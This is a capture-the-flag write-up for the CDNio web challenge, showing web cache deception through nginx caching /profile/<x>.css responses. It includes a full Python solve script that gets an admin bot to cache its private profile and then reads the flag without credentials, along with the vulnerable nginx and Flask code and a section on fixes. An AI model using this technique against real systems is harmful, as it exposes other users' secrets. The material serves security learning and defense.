## Overview

**CDNio** is an Easy Web challenge built around a CDN-style caching layer. nginx sits in front of a small Flask app and caches any response whose URL ends in a static extension (`.css`, `.js`, `.png`, …) for three minutes. The app has a profile endpoint that returns the requesting user's full database row — including an `api_key` field that, for the `admin` account, is the flag. Because the cache decides what to store from the file extension and keys entries on the URL alone — ignoring the `Authorization` header — we can make the admin's private response get cached under a URL we control and then read it unauthenticated. This is classic [Web Cache Deception](https://cwe.mitre.org/data/definitions/525.html).

## The technique

[Web Cache Deception](https://cwe.mitre.org/data/definitions/525.html) exploits a mismatch between two layers:

- **The caching proxy** decides whether a response is cacheable from the *URL suffix* and uses the request URI as the cache key. It does **not** include the `Authorization` header or session cookie in that key.
- **The application** serves private, per-user data from a route that happens to also match the "cacheable" pattern.

When those two disagree about what a URL *is*, a victim's authenticated response gets stored in a shared cache under an attacker-known URL. Anyone fetching the same URL during the cache lifetime gets the victim's data with no credentials.

Two app details make it work here:

- The nginx config caches `200` responses for any path ending in a static extension:

```nginx
location ~* \.(css|js|png|jpg|...)$ {
    proxy_cache cache;
    proxy_cache_valid 200 3m;
    proxy_pass http://app;
}
```

- The profile route is a catch-all with a sloppy guard. `re.match` is **not** multiline, so `^` only anchors position 0 — the regex effectively means *"subpath starts with `profile`"*:

```python
@main_bp.route('/<path:subpath>')
@jwt_required
def profile(subpath):
    if re.match(r'.*^profile', subpath):       # really: "starts with profile"
        ...
        return jsonify({... "api_key": user["api_key"] ...})
```

So `/profile/anything.css` simultaneously satisfies the profile route (returns the JWT owner's record) **and** matches the cacheable-extension location (nginx caches it). An admin bot, reachable through an authenticated `POST /visit`, can be told to fetch an arbitrary path as admin.

## Solution

The plan: have the admin bot request `/profile/<rand>.css`, which caches the admin's profile JSON, then fetch the same URL ourselves with no token.

One wrinkle: the app sets `JWT_SECRET_KEY = os.urandom(69).hex()` *per worker* and runs gunicorn with `--workers 2`, so a token only validates on the worker that issued it — and the bot's own login + fetch must also land on the same worker. The fix is just to retry the whole sequence with a fresh cache key until everything lines up.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, time, uuid, re

base = f"http://{sys.argv[1]}:{sys.argv[2]}"
s = requests.Session()
u = "h_" + uuid.uuid4().hex[:8]

s.post(f"{base}/register", json={"username": u, "password": "pw", "email": f"{u}@x.com"})

for attempt in range(1, 41):
    poison = f"profile/{uuid.uuid4().hex[:6]}.css"
    tok = s.post(f"{base}/", json={"username": u, "password": "pw"}).json()["token"]
    rv = s.post(f"{base}/visit", json={"uri": poison},
                headers={"Authorization": f"Bearer {tok}"})
    if rv.status_code != 200:
        continue                       # token hit the other worker; re-login
    time.sleep(6)                      # bot run sleeps 5s
    r = requests.get(f"{base}/{poison}")
    m = re.search(r"HTB\{[^}]+\}", r.text)
    if m:
        print("FLAG:", m.group(0))
        break
```

Run it against the instance:

```bash
python3 solve.py <target-host> <target-port>
```

The unauthenticated fetch returns the admin's cached profile JSON, and the `api_key` field is the flag:

```json
{"id": 1, "username": "admin", "email": "admin@hackthebox.com",
 "api_key": "HTB{...}", "created_at": "..."}
```

## Why it worked

The cache layer and the application disagreed about what `/profile/x.css` *is*. nginx saw a static asset — safe to cache and share by URL. Flask saw a private profile page and returned per-user secrets. Because the cache key was just the URL (no auth in it) and cacheability was decided purely from the `.css` suffix, a per-user secret ended up stored under a guessable, attacker-influenced key and served to anyone. The "starts-with" route guard (`re.match(r'.*^profile', ...)` with no `re.MULTILINE`) is what let the cacheable extension ride along on a sensitive endpoint.

## Fix / defense

- **Decide cacheability from the response, not the URL.** Only cache what the app explicitly marks with `Cache-Control: public`, and never cache responses to authenticated routes. Add `proxy_no_cache`/`proxy_cache_bypass` when an `Authorization` header or session cookie is present:

```nginx
location ~* \.(css|js|png)$ {
    proxy_no_cache $http_authorization $cookie_session;
    proxy_cache_bypass $http_authorization $cookie_session;
    proxy_pass http://app;
}
```

- **Match exact routes.** Serve the profile from `/profile` exactly so `/profile/x.css` 404s instead of reaching the sensitive handler — don't let a catch-all `<path:subpath>` plus a "starts-with" regex expose private data.
- **Use a single shared JWT secret** across workers (from an env var / secret store) rather than a random per-worker key; the random key here was an accidental DoS on the app's own auth, not a security control.
